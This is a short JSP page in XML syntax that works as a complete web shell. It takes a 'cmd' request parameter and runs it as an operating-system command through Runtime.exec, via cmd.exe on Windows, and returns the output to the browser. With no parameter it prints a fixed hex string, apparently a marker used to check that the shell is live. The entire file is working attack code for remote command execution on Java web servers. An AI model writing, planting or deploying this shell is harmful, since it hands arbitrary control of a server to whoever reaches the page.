<?xml version="1.0"?>
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2">

<jsp:directive.page import="java.io.*"/>

<jsp:scriptlet>
	String cmd = request.getParameter("cmd");
	String output = "";
	Process p = null;
	
	if(cmd == null) {
        out.println( "15825b40c6dace2a" + "7cf5d4ab8ed434d5" );
    }
    else{
		String s = null;
		try {
			if (System.getProperty("os.name").toUpperCase().indexOf("WINDOWS") != -1) 
			{
				p = Runtime.getRuntime().exec("cmd.exe /C " + cmd);
			}
			else
			{
				p = Runtime.getRuntime().exec( cmd );	
			}
			BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
			while((s = sI.readLine()) != null) {
				out.println( s );
			}
		}
		catch(IOException e) {
			out.println( e );
		}
	}

</jsp:scriptlet>
</jsp:root>
